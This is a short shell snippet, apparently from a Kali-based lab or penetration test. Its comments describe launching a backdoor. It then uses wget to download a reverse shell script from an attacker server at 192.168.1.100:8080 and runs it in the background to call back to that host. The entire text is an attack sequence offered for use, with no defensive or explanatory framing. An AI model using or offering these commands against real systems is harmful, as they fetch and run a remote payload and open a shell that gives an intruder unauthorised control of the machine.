# first, launch a backdoor to gain access to the system and download the reverse shell script
wget 192.168.1.100:8080/reverse_shell.py # 192.168.1.100 - server ip address | ip address kali VM
# launch
python reverse_shell.py 192.168.1.100 &
